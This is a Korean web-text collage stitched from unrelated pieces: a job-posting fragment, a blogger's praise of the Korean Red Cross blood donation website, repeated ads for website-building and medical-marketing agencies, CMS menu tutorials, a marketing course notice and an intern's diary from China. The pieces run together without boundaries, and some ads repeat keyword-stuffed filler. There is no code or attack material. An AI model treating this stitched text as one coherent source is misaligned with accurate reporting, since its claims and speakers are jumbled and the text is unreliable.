서류 합격자 개별통지7.급여조건: 면접시 협의 후 결정8.근무형태: 주 5일9.근무시간: 채용형태에 따라 별도 협의10. 모집기간: 2015. 12. 30일 까지  전국알리미는 상담몰과 쇼핑몰을 운영하고 있습니다. ﻿​﻿​​﻿​﻿* 전국알리미 상담몰: www.max007.com* 전국알리미 쇼핑몰: www.max007.co.kr  2015년 11월 28일 전 국 알 리 미​   △ 대한적십자사 혈액관리본부 홈페이지. 봄을 맞아 벚꽃 타이틀 화면이 참 예쁘다.      이 분홍빛 벚꽃 메인 타이틀 화면처럼 필자의 헌혈 인생에도 봄이 항상 왔으면 좋겠다.    대한적십자사 혈액관리본부 홈페이지.  헌혈에 대한 모든 것들을 안내하고, 헌혈과 혈액 나눔 이야기로 모두 다함께 나누는  헌혈 커뮤니티 공간.   그리고, 현재 내 헌혈 인생에서 떨어질래야 떨어질 수 없는 동반자.   나는 방금 전에 대한적십자사 혈액관리본부 홈페이지에 한 번 들어와 보았다.  참고로 나는 대한적십자사 혈액관리본부 홈페이지에 지난 2011년경에 처음으로 가입했다.  "skymiracle" 이라는 아이디로. ㅎㅎㅎ  처음 가입했을 때부터 헌혈하면서 의문이 든 것을 홈페이지 상담신청을 통해 질문을 참 많이 했고,  그리고 커뮤니티에서도 "나는 헌혈 중독자입니다." 라는 글을 써서  헌혈에 대한 나의 사랑을 마음껏 표현하기도 했다. ㅎ.ㅎ  물론 내 글에 많은 분들의 반응이 좋았고.... ^_^   그리고 등록헌혈회원, 즉 ABO Friend 로 가입한 이후에도 꾸준히 홈페이지 활동을 많이 했다.  홈페이지에 로그인하면 상단에 "마이페이지" 가 있는데,  "마이페이지" 에 들어가 보면 자신의 헌혈 기록과 검사결과,  그리고 자신이 홈페이지에 문의한 질문-답변 내용, 헌혈에 대한 자유로운 후기를 쓴 커뮤니티 글을 볼 수 있다.  다만 현재는 커뮤니티 글이 개인정보 보호로 인하여 글의 기한이 3년으로 자동삭제된다.  그리고 상담신청한 질문에 대한 답변은 대한적십자사 혈액원에서 답변을 해 준다.  나의 많은 질문에도 친절하게 답변해 주신 대한적십자사 혈액원에게 감사드립니다. ^^   그만큼 내가 헌혈에 대한 관심과 사랑이 크니까요. ㅎ.ㅎ   자신의 헌혈 기록은 몇 회인지, 그리고 다음 헌혈일이 언제인지도 친절하게 안내해 준다.  다만 검사결과를 보려면 개인 공인인증서를 이용해야 한다.   특히 본인이 이미 등록헌혈회원인 경우는 "ABO Friends" 에 들어가면  등록헌혈회원 가입일과 카드 번호, 선호 헌혈 종류와 헌혈 주기 등이 나타난다.  나의 경우에는 문진할 때 등록헌혈회원 카드를 찍으면 컴퓨터에 내 헌혈 의료기록이 나타나는데  내 사진을 전에 삭제한 적이 있었는데 사진이 나타나지 않아서  사진을 보이게 하기 위해 다시 등록헌혈회원 카드 발급을 신청하여 새로 바꾸었다.  물론 카드 번호도 끝자리 4자만 바뀌었고.  그래서 내가 "ABO Friends" 에 들어가면 카드 재발급 기록이 두 번 있다.  어쨌든 등록헌혈회원이신 분들이라면 대한적십자사 혈액관리본부 홈페이지에 꼭 가입하셨으면 좋겠고,  본인이 등록헌혈회원이라는 기록도 있으니 여러모로 많이 도움이 될 것이다. ^^   그리고 대한적십자사 혈액관리본부 홈페이지에서는 다양한 이벤트를 신청할 수 있다.  매달마다 하는 이벤트도 있지만, 지역적으로 벌이는 이벤트도 다양하다.  특히 매달마다 하는 이벤트는 "북 피크닉"과 "무료 라식 수술" 이 있다.  "북 피크닉"은 매달마다 세 권의 책을 제시하여 자신이 원하는 책 한 권을 골라 응모할 수 있으며,  이 이벤트에 당첨이 되면 물론 무료로 책을 받는다. ㅎ.ㅎ  각 책마다 100명의 당첨자로 총 300명이 매달마다 책을 받는다.  헌혈도 좋아하고 독서도 좋아한다면 이것이야말로 일석이조 아닐까~.  그리고 "무료 라식 수술"은 응모자들 중 매달 두 명씩만 선정되어 무료로 라식 수술을 받을 수 있다.  그 외에도 다양한 이벤트에 응모하고 당첨되고 선물도 받을 수 있어  여기 대한적십자사 혈액관리본부 홈페이지를 이용하는 데에는 아주 재미있을 것이다. ㅎ.ㅎ   그 외에 가끔씩 설문조사도 할 수 있고 공지사항마다 이번의 혈액원 혹은 헌혈의 집 휴무 여부를 알 수 있다.   지금은 아이디가 마음에 안 들어서 작년에 탈퇴하다가 다시 재가입했다.  "stephanie28" 이라는 아이디로 새로 재가입해서 지금까지도 많은 질문과 커뮤니티 글을 남기고 있다. ㅎ.ㅎ  그래도 여전히 나의 "ABO Friends" 와 헌혈 기록은 여전히 그대로 남아 있다. ㅎㅎㅎ   앞으로도 나는 헌혈도 하면서 이 대한적십자사 혈액관리본부 홈페이지를 꾸준히 자주 이용할 것이다. ^^   나처럼 헌혈을 좋아하는 분들이라면  꼭 대한적십자사 혈액관리본부 홈페이지에 가입하길 바란다.   다양한 이벤트와 헌혈 후기, 그리고 재미있는 요소들이 많고 헌혈과 혈액에 대한 상식들이 많아서  홈페이지는 "헌혈 백과사전" 이라고 해도 과언이 아니다. ㅎ.ㅎ  그 외에 자신이 헌혈하면서 의문이 들거나 모르는 부분이 있으면 개인적으로 상담신청을 하시길.   내 헌혈 인생의 동반자.  대한적십자사 혈액관리본부 홈페이지.  그리고 대한적십자사 혈액관리본부 공식 블로그 "레드스토리". ^^   대한적십자사 혈액관리본부 홈페이지와 "레드스토리" 에도 놀러 방문해 주세요~!! ㅎ.ㅎ    * 대한적십자사 혈액관리본부 홈페이지 :  http://www.bloodinfo.net    * 대한적십자사 혈액관리본부 공식 블로그 "레드스토리" :  http://blog.naver.com/blood_info    광주홈페이지제작 관리까지 한번에!  안녕하세요 디지털마케팅컴퍼니 빌리언즈입니다~!!광주홈페이지제작 10억홈피가 여러분께 새로운 이름인빌리언즈로 다시 찾아오게 되었답니다! 이처럼2020년 다가오는 새해, 새로운 비즈니스를 위해 홈페이지제작 하거나 기존의 홈페이지를 새로 개편을생각하시는 분들이 많으실텐데요! ​하지만 막상 어떤 홈페이지제작업체를선정해야할지, 어떻게 진행해야할지 고민하시는 분들 위해 빌리언즈가 찾아왔답니다!  기업홈페이지제작 홈페이지도 다 같은 홈페이지가 아니죠!업종에 따라 각기 다 다른 프로그램 개발과 디자인이 필요하기 마련인데요! 먼저 기업홈페이지제작 부터 살펴볼까요?내가 찾고 싶아갈 기업이 어떤 모습의 홈페이지로 보이느냐에 따라 사람들의 인식이 달라지기 마련인데요!​기업 홍보용 홈페이지는 기업의 이미지에 맞는 기획과 디자인이 필요하답니다! 빌리언즈에서는 국가기관, 공공기업뿐만 아니라 다수의 기업홈페이지를 제작해온 경험으로 고객님들께 원하시는 기업의 느낌을 살려 홈페이지제작 해드린답니다!요즘은 사용자의 디바이스에 따라 최적화된 화면을제공하는 반응형 홈페이지가 대세라는 사실!최근 광주홈페이지제작도 반응형 홈페이지로 따라가는 추세랍니다!  쇼핑몰제작    요즘은 오프라인시장보다는 온라인 시장의 강세가 두드러지고 있죠? 배송시스템이 발전되면서 빠르면 하루만에도 원하는 물건을 받아볼 수 있게 되었죠!그에따라 쇼핑몰 제작 또한 많이 이루어지고 있는데요~​쇼핑몰 홈페이지는 소비자로 하여금 신뢰감을 줄 수 있고 실시간 소통의 공간이 되어주기 때문에 온라인 비즈니스에서꼭 필요하기 마련인데요! 쇼핑몰 제작은 판매,결제 부분이 추가 되어야하기 때문에 많은 프로그램 개발이 필요한데요!빌리언즈에서는 고급형 홈페이지제작 같은 경우회원관리, 쇼핑몰 모듈, 상담모듈, SMS 모듈, 방문자통계 모듈을기본적으로 제공해드립니다!   병원홈페이지제작 / 펜션홈페이지제작  펜션이나 호텔 등 숙박업소 같은 경우예약 관리 프로그램이 필수인데요!모든 사용자의 화면에 동일한 콘텐츠가 제공되도록웹표준을 준수해서 개발하고 있답니다~또한 1:1 담당자 전담팀을 구성해 고객님께서원하시는 디자인과 프로그램 개발을 해드리고 있습니다~​광주의 다수의 병원홈페이지제작까지!14년 이상 다양한 업종의 홈페이지제작 경험을 통해믿고 맡길 수 있는 빌리언즈!고객과의 커뮤니케이션을 통해홈페이지를 만들어가는 빌리언즈에서 2020년 원하는 광주홈페이지제작 완성해보세요:)​​▼광주홈페이지제작 문의하기▼   ​​​ 네이버 블로그는 맞지만, 확인불가홈페이지관리/홈페이지유지보수/홈페이지문의​​홈페이지를 어떻게 관리해야 오래사용할 수 있을까요?기본적으로 홈페이지 수정이 가능해야 합니다.디자인적 요소나 기능적 요소는 업체에 맡기셔서 수정이 가능해야 오래사용할 수 있습니다. 탬플릿형은 원본소스를 공개하지 않기 때문에 수정이 어려운 부분이 많습니다.때문에 초기 제작비용은 저렴할지라도 제작 후 유지보수 및 수정이 어려워 결국 오래사용하지 못하고 새롭게 제작을 하게되는 경우가 생깁니다.​​ 홈페이지는 제작도 중요하지만 제작 후 관리 및 유지보수가 더욱 중요합니다.비용을 들여서 제작을 했는데 오래사용하지 못하면 그만큼 낭비가 없겠죠? 그래서 초기제작비용만 생각하고 업체를 선정하지 마시고 얼마나 오래사용하고어떻게 관리가 되는지를 확인하셔야 합니다.직접 컨트롤할 수 있는 부분이 무엇인지도 꼼꼼히 따져보셔야 합니다. 홈페이지제작, 아무업체에게나 맡기지 마시고 유지보수, 관리까지 책임질 수 있는 업체와 진행하세요. 홈페이지업체 (주)지앤글로벌*감각디자인www.gnglobal.co.kr ◀ 온라인상담문의전화 : 02-523-2825많은 문의 부탁드립니다. 평생교육사 자격제도 및 자격취득 관련 정보 제공을 위한 「평생교육사 자격관리」홈페이지가 개설되었습니다.위의 이미지를 누르시면 홈페이지로 이동합니다. □ 오픈일시 : 2013. 2. 20(수)□ 주요기능- 평생교육사 자격제도 전반 안내(자격제도 소개, 관계법령, 자격기준 안내 등)- 평생교육사 관련 매뉴얼, 서식자료, 통계자료 제공- 사이버상담실, FAQ 제공- 평생교육사 관련 DB 및 통계자료 제공  'TOP메뉴 관리 - 홈페이지 관리 ⑨'  저번 포스팅 '[홈페이지 관리] QnA관리 - 홈페이지 관리 ⑧' 에서는 QnA 메뉴 등록과 작성 방법에 대해 알아보았는데요,이어서 이번에는 TOP메뉴 관리방법에 대해 알아보도록 하겠습니다.^^TOP메뉴등록은 1편 메뉴 등록과 유사한 방식으로 등록 할 수 있는데요~ 아래와 같이 홈페이지 상단 (메인메뉴 위)에 표시되는 TOP 메뉴를 사용자가 ﻿직접 관리 할 수 있습니다.^^이번에도 명지대학교 총동문회 홈페이지를 예시로 보여드리겠습니다.  ﻿﻿    1.Top메뉴 추가하기    관리자 웹에 로그인을 한 뒤 상위 [홈페이지관리] 메뉴→ [홈페이지메뉴관리] 메뉴를 클릭한 뒤메인 메뉴 등록을 위해 ‘추가’ 버튼을 클릭합니다.     클릭해주시고 메뉴를 등록하는 팝업 창이 뜨면 1st메뉴(메인 메뉴)란에 제목을 적으시고, 메인사용여부, 정렬 순서를 등록해 주세요~^^     내용을 모두 입력 후, ‘저장’ 버튼을 클릭합니다.   2.Top 2nd 메뉴 추가하기   이번에는 상위 메뉴 (메인메뉴)의 하위 메뉴(서브 메뉴)를 등록하도록 하겠습니다~ [Top메뉴] 메뉴가 추가가 된 것을 확인 하실 수 있습니다.      이제 Top 메뉴 영역에 보여질 2nd 메뉴등록을 위해 ‘등록’버튼을 클릭합니다       메뉴를 추가 하기 위해 왼쪽 페이지 유형 리스트에서 ‘Login’메뉴 클릭합니다.      서브 메뉴의 제목, 메인 여부, 정렬 순서를 등록합니다.(참고:가장 처음 위치하게될 메뉴에는 '정렬순서' '1'을 입력,이미지를 첨부하실 경우 ' Y ' 버튼에 체크해주세요~)  모두 작성 하셨으면  ‘저장’ 버튼을 클릭합니다.       위와 동일한 방법으로 Top메뉴 영역에 보여질 2nd 메뉴를 '추가'합니다.추가한 메뉴 리스트를 확인 할 수 있습니다.           등록한 ‘TOP메뉴’ 가 홈페이지 상단에 적용 된 것을 확인 할 수 있습니다.^^ 로그인 전 화면입니다.  로그인 후 화면 입니다.     '메뉴&사용자화면관리-홈페이지 관리 ① ' 편과 유사하게 홈페이지 TOP메뉴 등록에 대해 알아 보았는데요,TOP메뉴 역시 메뉴를 어떻게 효율적으로 구분하여 등록하느냐에 따라 관리가 더 수월 해집니다.메뉴를 간편한 관리를 도와주는 officeCRM과 함께 하세요~^^ 다음 편에는 TOP메뉴관리에 대한 Tip내용이 있으니 참고 하시길 바랍니다~^^                병원의 제 2의 얼굴이라고 할 수 있는 건 병원홈페이지를 일컫는 말입니다.바이럴마케팅보다도 병원의 느낌을 잘 표현해 줄 수 있는 것으로무엇보다 중요하다고 할 수 있습니다. 병원홈페이지제작과정은 단순히 말하면 기획-> 디자인-> 제작-> 관리 입니다.이 중 가장 중요한 것은 기획 즉, 컨셉을 어떻게 정하느냐에 따라서병원홈페이지의 전체적인 틀이 잡힙니다. 홈페이지는 그 목적에 따라서 제작됩니다.병원홈페이지도 병원의 진료안내, 의료진소개, 시술, 커뮤니티 등기본적인 틀이 잡혀있지만 기획(컨셉)과 디자인 의도가 틀이 잡혀야 전체적인 큰 덩어리가 형성이 됩니다.  차별화된 디자인은 차별화된 병원의 이미지형성에 도움을 주고,병원의 방문 상담을 유도할 수 있는 온라인 상담의 전환이 증가하게 됩니다.이러한 전환을 잡기 위해서 디자인이 들어가기 전 명확한 병원브랜드 이미지 형성에 도움이 되도록기획단계에서 큰 틀을 잡아 주어야 합니다.  기획단계에서 큰 틀이 잡히고 컨셉이 결정되었다면, 디자인 작업이 들어갑니다.이 때부터는 병원과의 협력을 통해서 원만한 디자인과병원이미지에 맞는 홈페이지가 제작되어 합니다. 플래쉬, 에프터임팩트 등 영상 프로그램을 활용한 디자인은고급스러운 느낌을 주지만 작업기간이 지연될 수 있으므로확실한 디자인 컨셉이 결정되었을 때 제작해줍니다.  디자인작업시 주의해야 할 점은 전체적인 레이아웃이나 컨셉을 중도에 변경하게 되면원하는 홈페이지 오픈일을 맞추기 힘들기 때문에사전에 부족한 부분이나 보완해야하는 부분은협력을 통해서 꾸준히 변경해줍니다.  디자인작업이 끝이 나고 코딩 작업과 프로그램으로 종료가 되면 끝이 나는 것이 아니라병원홈페이지에 대한 관리가 필요합니다. 병원홈페이지제작 엠비젼 플러스에서는병원홈페이지제작 뿐 아니라 관리까지도 해주므로처음부터 끝까지 책임질 수 있습니다. 병원홈페이지제작 문의하러가기 ▲ 네이버 블로그는 맞지만, 확인불가홈페이지관리/홈페이지수정/홈페이지유지보수​​홈페이지제작만큼 중요한것이 어떻게 관리하며 사용하느냐 입니다.한번 제대로 제작된 홈페이지는 몇년간 기업을 대표하는 공간이되기 때문에관리 및 유지보수도 믿을 수 있는 업체와 진행하셔야 하는데요~ 저희 감각디자인은 독립형으로 홈페이지를 제작해 드리기 때문에한번 제작된 홈페이지는 고객님 소유가 되어 원본소스를 제공해 드립니다.홈페이지를 수정하거나 유지보수를 진행하기위해서는 원본소스 및 정보가 필요합니다.​​ 저희 감각디자인은 소스를 전부 제공해 드리기 때문에 차후 수정사항이 생겨도수월하게 진행이 가능하고 유지보수계약을 따로 맺으신 분들은내역에 해당되는 사항을 추가적으로 작업해 드립니다. 홈페이지를 직접 관리하실 수 있도록 관리자모드를 셋팅해드려자료를 업로드하시거나 제품을 자유롭게 업로드하실 수 있습니다. 홈페이지제작 관련하여 궁금하신 사항은 아래 번호로 문의주세요^^​​▼▼ 감각디자인홈페이지 바로가기 Click! ▼▼​​​  'QnA 관리 - 홈페이지 관리 ⑧' ﻿저번 포스팅 '[홈페이지 관리] 채용관리 - 홈페이지 관리 ⑦]' 에서는 등록된 기업의 동문들을 대상으로한 채용 등록에 대해서 알아보았는데요, 이어서 이번에는 Q&A 메뉴를 등록하고 작성하는 방법에 대해 알아보도록 하겠습니다.^^Q&A 게시판은  사용자가 궁금한 사항을 작성하여 담당자에게 질문을 할 수 있는 페이지 입니다. 이번에도 예시는 명지대학교총동문회 홈페이지로하여 설명드리겠습니다~  현재 아래와같이 명지대학교 총동문회 홈페이지에는 질문답변 메뉴를 만들어 관리 하고 있습니다~이와같이 질문 답변 메뉴가 있다면 공동되게 궁금한 사항이나 문의에대한 번거로움을 줄일 수 있겠죠?^^     1.2nd 메뉴(서브메뉴)  등록하기   [홈페이지관리] 메뉴 → [홈페이지메뉴관리] 메뉴를 클릭합니다.왼쪽의 메인 메뉴를 선택한 뒤, 그 메인 메뉴의 서브 메뉴를 만들기 위해 우측 상단의 '등록' 버튼을 클릭합니다.      '등록' 버튼을 클릭하면 아래와 같이 팝업 창이 뜨는데요,좌측의 2nd 메뉴 유형에서 'QnA'를 선택합니다.오른쪽의 내용을 모두 작성한 뒤 '저장' 버튼을 클릭합니다.     홈페이지에 적용된 'QnA' 메뉴와 'QnA' 페이지를 확인 하실 수 있습니다.                      작성자는 제목, 작성자, 이메일, 연락처, 내용 등을 입력한 후에       ‘E-mail 전송’을 클릭하면 관리자의 이메일로 전송되어 쉽고 빠르게 문의를 할 수 있습니다^^ 또한 저희 ‘officeCRM’ 으로 관리자 이메일 주소를 보내주시면 이메일 계정을 소스에 등록하여, 실시간으로 관리자 이메일로 질문을 받으실 수 있습니다.^^              @ 기업홈페이지제작 관리를 제일잘하는 홈페이지업체...a 기업홈페이지제작 경력이 조금 되는 업체이어야하지아늘까합니다.기업홈페이지제작이란 아주경력이 오래된 홈페이지제작업체일수록 실력을 검증받고 믿을 수 있을것입니다.아무리 신생업체들이 인력을 경력자들로 확보할수 있어라도, 처음입문한 신생업체이기때문에경력이많은 오래된회사와 절대 비교를 할수가 없습니다.왜그런지는 경험했던분들은 다 알지않을까싶습니다^^b 인력이 아주 충분하게 배치되어야 할수있습니다.기업홈페이지제작 쪽으로는 충분한 인력이 풍부한 업체가 제대로되어있는 유지보수를 하더라도 잘하지않나싶습니다.인력이 그렇치않는업체라면 기업홈페이지관리를 안정적으로 체계적으로 할수없다고보시면됩니다.그리고 기업홈페이지관리나 걔발관련 업체들이 갓오픈한회사나 영세업체들이 무한히 많습니다.기업홈페이지관리 부분에 오래된 업체일수록 실력을 믿을수있지아늘까요?새로오픈한 업체가 제아무리 경력자가많은 인원을 확보하더라도오픈한지얼마되지않기때문에 오래된경험많은 업체과 절대 비교불가능합니다.기업홈페이지제작은 회사이미지와 매출효과와 많은관력이있습니다.그리고 홈페이지는 외부로따지면 인터넷안에 집과똑같다고 보시면되십니다싸게 안좋은재료로 지어진 부실건물들이 되느냐,조금은 고가지만 안정적이고 튼튼한 건물을 짓느냐는지금 이글을 읽으시는 고객들 선택에 달려있다고 봅니다.자그럼 좋은집을 지으러가볼까요^^ (클릭)   #온라인마케팅 #온라인마케팅전문가과정 #온라인마케팅전문가 #마케팅 #네이버모두 #네이버 #modoo #홈페이지제작 #콘셉트 #코로나19 #방역 #코로나19방역 #김혁대표 #김영갑교수 #KYG상권분석연구원 #강상현강사​코로나19 환경에서 온라인 마케팅 전문가 과정 교육을 하기 위해서는 방역을 하고 열체크와 참석 인원을 체크해야 합니다 코로나 19 환경에서는 교육 준비가 다릅니다온라인 마케팅 전문가 과정 10기 네이버 Modoo 홈페이지 제작​​ 온라인  마케팅 전문가 과정에 참석한 수강생은 모두 열체크와  고객 명부를 작성합니다~!교육은 온라인 교육과 오프라인 교육을 병행합니다​참석이 힘든 수강생을 위해 동영상 강의를 녹화 제공합니다네이버 Modoo 홈페이지 제작 방법에 대한  노하우를 한번에 교육해습니다네이버 Modoo홈페이지 제작 교육 목차​1. Modoo 홈페이지 소개2. Modoo 홈페이지 제작 및 편집3. Modoo 홈페이지 관리홈페이지 제작을 위한 콘셉트는 어떻게 만들까요?​짧은 시간에 무엇을 하는 음식점인지알리지 못한다면​짧은 시간에 다른 음식점과의 차이와 우위를 알리지 못한다면​여러분의 콘셉트는 다시 수정하셔야 합니다김영갑 교수와 강상현 강사의 온라인 마케팅 전문가  과정에서 홈페이지 제작과 콘셉트 설정에 대한 강의가 있었습니다​본 교육을 위해 코로나 19 환경에 안전 교육을 위한 방역과 열체크와 참석명부 및 마스크 체크를 하였습니다​또한 참석자 간의 거리를 두고 자리 배치를 하였습니다  <글/그림> 김혁 연구원, 상권분석가, 사업 컨설턴트, 푸그 애널리스트  안녕하세요? 고객만족도 압도적 1위 대한민국 온라인 마케팅의 기준, 마케팅은 역시 케이티온입니다.​병의원을 운영하며 혹은 개원을 앞두며 홈페이지 제작에 대한 고민을 하고 계신 분들이 많으신데요. 지난 과거와는 달리 현재는 온라인 마케팅을 통해 병의원 매체의 홍보 뿐만 아니라 신규 환자 유치 및 매출 극대화를 이루고 있는데요. 이러한 좋은 시너지를 내기 위해서는 신뢰있는 파트너를 선택하시는 것이 중요합니다. 특히 홈페이지는 병의원의 브랜딩과 이미지를 구성해 나가는 만큼 마케팅 뿐만 아니라 디자인 요소 또한 쉽게 결정할 수 없는데요. 케이티온에서의 브랜딩 구축과 함께 각 이미지에 알맞은 전주홈페이지제작이 어떻게 이루어지고 있는지 안내해드리겠습니다. 케이티온은 15년 업력을 자랑하고 있는 마케팅 기업인데요. 대전본사, 세종사옥, 청주사옥을 보유하고 있어 탄탄한 입지를 자랑하고 있지요. 대전 본사 사옥을 중심으로 청주 사옥은 리모델링 및 확장 이루어졌으며, 세종 사옥은 작년 준공을 완료해 보다 가깝게 전주홈페이지제작과 마케팅 서비스를 제공해드리고 있답니다. 케이티온은 ‘압도적 1위 대한민국 온라인마케팅의 기준, 마케팅은 역시 케이티온’이라는 슬로건을 항상 강조해드리고 있는데요. 안과, 치과, 성형외과, 피부과, 내과, 신경과, 외과, 한의원, 신경외과, 정형외과, 비뇨기과, 대학병원, 산부인과, 재활병원, 동물병원, 산후조리원, 이비인후과, 마취통증의학과, 통증의학과, 요양원, 요양병원, 흉부외과, 재활의학과, 소아청소년과, 여성의원(유방/갑상선), 항문외과, 영상의학과, 정신건강의학과까지 전국 최다 총 28개 진료과목에 대한 체계적인 프로세스를 구축하고 있는 케이티온. 병의원 외에도 가구, 자동차 정비, 공업사, 변호사, 변리사, 특허, 호텔, 인테리어, 펜션, 학원 등의 광고 영역도 함께 진행하고 있어 병의원이 아니어 고민하고 계셨던 분들도 부담없이 언제든지 전주홈페이지제작 상담을 받아보시기 바랍니다. 병의원 및 사업체 총 200여개 클라이언트, 전국최대 마케팅의 중심 케이티온에서 시작해보세요! 믿고 방문할 수 있는 곳 어디로 가야할까?요즘은 그저 가까운 병원이 아닌 환자가 직접 검색을 통해 알아본 뒤 병원을 선택하기에 마케팅이 중요한 현실입니다. 병원 원장님과 실무자 분들께서는 환자분들의 진료와 병의원 운영에 집중하셔야 하는 만큼 귀하의 병원에 알맞은 광고 영역 및 마케팅 포지션을 세밀하게 체크하기에 어려움이 있는데요. 믿을 수 있는 파트너 케이티온과 함께라면 병의원 마케팅, 어렵지 않습니다. 케이티온은 각 병의원에 가장 어울리는 마케팅 분야를 캐치하고 체계적인 반영을 통해 신규 환자 증가 및 매출 극대화를 이룰 수 있도록 도와드립니다.​저희 케이티온과 함께 1:1 개인 맞춤형 상담부터 최적화된 솔루션 제안을 받아보시기 바랍니다.​ ㈜케이티온 대전MBC와 협약 체결!온라인 마케팅 업계 중 최초로 케이티온과 대전MBC가 의료 정보 프로그램 ‘오늘 M 특별판 의료 톡톡’ 섭외 지원 협약을 체결하였습니다. ‘의료 톡톡’ 프로그램은 원내에서 촬영이 진행되며 대전 MBC 홈페이지 및 유튜브 채널에 영상이 게시되는데요. 이를 통해 환자분들과의 소통 및 각종 의료 정보들을 전달할 수 있는 좋은 기회의 창이 되셨으면 하는 마음입니다. 케이티온은 세심한 파트너로써 여러분들께 더욱 좋은 매체를 통한 마케팅 서비스를 지원해드릴 수 있도록 언제나 노력하고 성장하고 있답니다. (상단 이미지를 클릭하시면 케이티온의 의료톡톡 포트폴리오를 살펴보실 수 있습니다.)​ 전주홈페이지제작은 단순한 업체의 홍보가 아닌 고객의 발길을 이끌어낼 수 있는 방향으로 제작되어야 합니다. 현재 고객님의 홈페이지는 어떤지 살펴보시기 바랍니다. 각 기업의 이미지가 원하는 모습으로 표현되고 있는지, 마케팅 의도에 따라 제작된 것이 맞는지, 영업적 활용 및 매출에 도움이 되고 있는지 체크해보세요. 이 중 하나라도 해당되지 않는다면 케이티온을 통해 마케팅 솔루션을 받아보시기 바랍니다. 외관 상 같은 내용으로 보인다고 할지라도 카테고리의 구성과 메뉴 디자인 등을 어떻게 설정하는지에 따라 업체의 이미지 설정과 마케팅의 극대화를 이룰 수 있기 때문입니다. 병의원 마케팅은 의료법 준수하에 이루어져야 한다는 부분. 다들 잘 숙지하고 계십니까?케이티온은 성공 실현 비전, 크리에이티브 디자인, 경쟁력을 위한 차별화, 마케팅 강화와 같이 크게 네 가지의 요소를 중점에 두어 전주홈페이지제작을 실시하고 있습니다. 기획단계부터 탄탄한 케이티온! 1:1 클라이언트와의 상담을 통해 진료과목에 맞춘 상세한 분석과 타깃, 전략을 보다 명확하게 선정하여 전주홈페이지제작을 진행하고 있는데요. 총 28개 진료과목을 다루고 있는 케이티온인 만큼 병원만의 특수성을 누구보다 잘 이해하고 접근하여 각 과정마다 클라이언트와의 원활한 소통을 통해 꼼꼼하게 작업이 진행됩니다.​ 총 200여개의 클라이언트에 대해서는 케이티온의 홈페이지에서 포트폴리오를 통해 확인해보실 수 있는데요. 상단 이미지를 클릭하여 저희 공식 홈페이지에 게시된 포트폴리오를 살펴보시기 바랍니다. 최근 스마트폰 사용 빈도가 많아짐에 따라 PC뿐만 아니라 모바일 환경에 맞춘 홈페이지 제작 또한 중요한데요. 상단 이미지를 클릭하시면 케이티온의 모바일 홈페이지 제작 포트폴리오를 확인하실 수 있습니다. 전주홈페이지제작, 마케팅의 시작에 있어 첫 발걸음인 만큼 믿을 수 있는 곳에서 하셔야죠. 유능한 파트너, 저희 케이티온과 함께 출발해보시기 바랍니다. 더욱 자세한 사항은 아래의 배너를 클릭하여 전화상담 및 온라인상담 받아보시기 바랍니다.  케이티온대전광역시 서구 둔산중로14번길 15-4케이티온 세종지사세종특별자치시 다정중앙로 46케이티온 광주지사광주광역시 광산구 장신로 139케이티온 청주지사충청북도 청주시 상당구 사직대로 371케이티온 천안지사충청남도 천안시 서북구 부성8길 38 계룡타워 503-2호 케이티온빌딩대전광역시 서구 둔산중로14번길 15-4케이티온S타워세종특별자치시  다정중앙로 46케이티온원주지사강원도 원주시 현충로58번길 29-1 ​ 네이버 블로그는 맞지만, 확인불가갈수록 흥미진진해지는 인턴생활!3주차라서 3배속으로 흘러갔던것 같다.  ​​​​   ​관리자 사이트 들어간지 3주만에 발견한"文芝英님 좋은하루" ㅋㅋㅋㅋㅋ하루의 시작을 활기차게 해줘서 고맙다 ^^;​​​​​​     ​우리 회사에서 주로 다루는 홈페이지 안에 BEST DEAL이라는 카테고리가 있는데자세히 보면 공란으로 되어있는 곳이 간간이 있다.​공란 덕분에 나에게 일이 하나 생겼다,,ㅎ공란이 보일때마다 물건을 채워야한다는사수님의 말씀:-)정말 정말 간단한 일이지만 날이 갈수록 이렇게 책임지고 하는일이 늘어나고 있다. (뿌듯)​​​​​   ​월요일 점심은 마라탕!주말동안 마라탕을 못 먹어서 그리웠다 : (아마 매주 월요일은 마라탕을 먹지 않을까 싶다~​​​​​   ​후식으로는 요거트!!하나에 3위안(500원), 가성비 최고👍북경대 있을때부터 자주 사먹었던 요거트인데 일반 대형마트에는 잘 안팔고 편의점에만 판다.오른쪽은 같이 인턴하는 언니가 먹은 스벅 벚꽃라떼(맛있었다고 합니다)​​​​​    ​두 사진은 화요일에 찍은 사진인데왼쪽은 출근할때오른쪽은 점심먹고 산책할때 찍은 것이다.3시간만에 미세먼지가 다 걷어진파란하늘에 놀랐고한국으로 미세먼지가 다 가버린것 같아서 마음이 착잡했다.  ​​​​​​      ​이제부터는 열일한 모습만 보여드릴게요  사수님께서 1300개정도 되는 물건 리스트와 상품 분류 번호 리스트를 보내주셨다.각 물건을 보고 상품 분류 번호 붙여넣는 간단한 작업이였지만중국어가 부족한 나는 금같은 시간을 들여서 모르는 상품 분류 이름 뜻을 파악하고 일을 시작,,다행히 겹치는 상품들이 많아서1300개를 후딱 끝냈다!!​​​​​      그리고 저번주에 했던 중국 유아화장품 시장조사를 본부장님께 보내드렸는데사진도 없고 각 페이지마다 크기도 달라서 한눈에 안 들어온다는 피드백을 듣고 수정을 했다.​한번해도 되는 일을 두번하면서나중에 취직하면 절대 이러지 말아야겠다고굳게 다짐했다..! 일은 속도가 중요한게 아니라 정확하게 잘 하는 것이 중요하다.​​​​  중국 온라인 쇼핑몰, VIP 인터네셔널 한국관 ​중국 유아용 화장품 시장조사의 연장선으로중국 내 한국화장품 시장조사를 하게 되었다.​중국에서 이제 먹히는 물건은 화장품 밖에 남지 않았다고 할 정도로중국은 많은 부분에서 이미 한국을 따라잡았다고 한다.​중국 유아용 화장품 시장조사 했던것 처럼티몰,징동에서 팔리는 한국 화장품을 알아보았고 (+VIP 국제)화장품 종류가 엄청 많다보니 피부관리 제품과 색조 제품으로 나누어서 조사를 했다.(덕분에 조사할 양이 두배로 늘어났고..)​저번주에 대기업 피피티 만들면서약간 스트레스를 받았는데이번에는 관심분야인 화장품을 조사를 하니까일이 참 재미있더라 ㅎㅎㅎ​​​​ ​     ​추가로 "Huya"라는 중국의 인터넷 생방송 플랫폼의 현황을 조사하는 과제도 받았다.(2시간안에 끝낸 간단한 과제)​Huya(후야)는 우리나라 아프리카tv같은 느낌의 생방송 플랫폼인데대부분 게임 콘텐츠를 다룬다.​이 조사의 목적은 저번주에 언급했던  한국 마스크팩을 이 플랫폼으로 광고를 하면 효과가 있을지 없을지에 대한 것이였다.​후야에 대한 간단한 소개를 적고 광고 효과 유무에 대한 생각을 제시하면서조사를 마무리 지었다.​​​​​   